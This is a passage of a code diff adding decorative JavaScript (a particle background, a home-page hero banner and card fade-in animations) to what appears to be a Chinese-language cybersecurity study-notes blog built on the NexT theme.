+      ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
+      drawLinks();
+      for (var i = 0; i < particles.length; i++) {
+        particles[i].update();
+        particles[i].draw();
+      }
+      requestAnimationFrame(animate);
+    }
+
+    function createParticles() {
+      particles = [];
+      for (var i = 0; i < MAX_PARTICLES; i++) particles.push(new Particle());
+    }
+
+    // 初始化
+    resize();
+    createParticles();
+    animate();
+
+    // 鼠标 / 触摸
+    window.addEventListener('mousemove', function (e) {
+      mouse.x = e.clientX;
+      mouse.y = e.clientY;
+    });
+    window.addEventListener('mouseout', function () {
+      mouse.x = -9999; mouse.y = -9999;
+    });
+    window.addEventListener('touchmove', function (e) {
+      if (e.touches[0]) {
+        mouse.x = e.touches[0].clientX;
+        mouse.y = e.touches[0].clientY;
+      }
+    });
+
+    // resize
+    var resizeTimer;
+    window.addEventListener('resize', function () {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(function () {
+        resize();
+        createParticles();
+      }, 200);
+    });
+
+    // 低性能模式：电池或低性能时减粒子
+    if (navigator.getBattery && navigator.getBattery()) {
+      navigator.getBattery().then(function (battery) {
+        if (battery.discharging && battery.level < 0.2) {
+          MAX_PARTICLES = 25;
+          createParticles();
+        }
+      });
+    }
+  }
+
+  // ====================================================================
+  // 2. Hero 区：仅首页注入
+  // ====================================================================
+  function injectHero() {
+    // 通过 page 配置判断是否首页
+    var pageConfigs = document.querySelectorAll('script.next-config[data-name="page"]');
+    var isHome = false;
+    for (var i = 0; i < pageConfigs.length; i++) {
+      try {
+        var cfg = JSON.parse(pageConfigs[i].textContent || '{}');
+        if (cfg.isHome === true) { isHome = true; break; }
+      } catch (e) {}
+    }
+    if (!isHome) return;
+
+    var mainInner = document.querySelector('.main-inner.index.posts-expand');
+    if (!mainInner) return;
+    if (mainInner.querySelector('.hero-section')) return; // 防止重复
+
+    var hero = document.createElement('section');
+    hero.className = 'hero-section';
+    hero.innerHTML = ''
+      + '<div class="hero-content">'
+      + '  <span class="hero-eyebrow">CYBER · SECURITY · NOTES</span>'
+      + '  <h1 class="hero-title">网安学习笔记</h1>'
+      + '  <p class="hero-subtitle">'
+      + '    记录渗透测试、漏洞挖掘、安全工具开发的实践笔记。'
+      + '    <br>每一篇都是亲手敲过的 Payload、跑过的命令、踩过的坑。'
+      + '  </p>'
+      + '  <div class="hero-actions">'
+      + '    <a class="hero-btn hero-btn--primary" href="#main">'
+      + '      <i class="fa fa-book-open"></i> 开始阅读'
+      + '    </a>'
+      + '    <a class="hero-btn hero-btn--ghost" href="/about/">'
+      + '      <i class="fa fa-user"></i> 关于本站'
+      + '    </a>'
+      + '  </div>'
+      + '</div>'
+      + '<div class="hero-scroll-hint">SCROLL</div>';
+
+    mainInner.insertBefore(hero, mainInner.firstChild);
+
+    // 入场动画
+    setTimeout(function () {
+      hero.style.opacity = '0';
+      hero.style.transform = 'translateY(20px)';
+      hero.style.transition = 'opacity 0.8s ease, transform 0.8s cubic-bezier(0.16, 1, 0.3, 1)';
+      requestAnimationFrame(function () {
+        hero.style.opacity = '1';
+        hero.style.transform = 'translateY(0)';
+      });
+    }, 50);
+  }
+
+  // ====================================================================
+  // 3. 卡片入场动画（首页文章）
+  // ====================================================================
+  function animateCards() {
+    var cards = document.querySelectorAll('.index.posts-expand .post-block');
+    if (!cards.length) return;
+    if (!('IntersectionObserver' in window)) return;
+
+    cards.forEach(function (card, idx) {
+      card.style.opacity = '0';
+      card.style.transform = 'translateY(24px)';
+      card.style.transition = 'opacity 0.6s ease ' + (idx * 0.08) + 's, transform 0.6s cubic-bezier(0.16, 1, 0.3, 1) ' + (idx * 0.08) + 's';
+    });
+
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          io.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+
+    cards.forEach(function (card) { io.observe(card); });
+  }
+
+  // ====================================================================
+  // 4. 启动
+  // ====================================================================
+  function boot() {
+    try { initParticles(); } catch (e) { console.warn('particles failed:', e); }
+    try { injectHero(); } catch (e) { console.warn('hero inject failed:', e); }
+    try { animateCards(); } catch (e) {}
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', boot);
+  } else {
+    boot();
+  }
+
+  // PJAX 兼容（NexT 用 pjax 切页）
+  window.addEventListener('pjax:success', boot);
+})();
+</script>
+
+</body>
+</html>
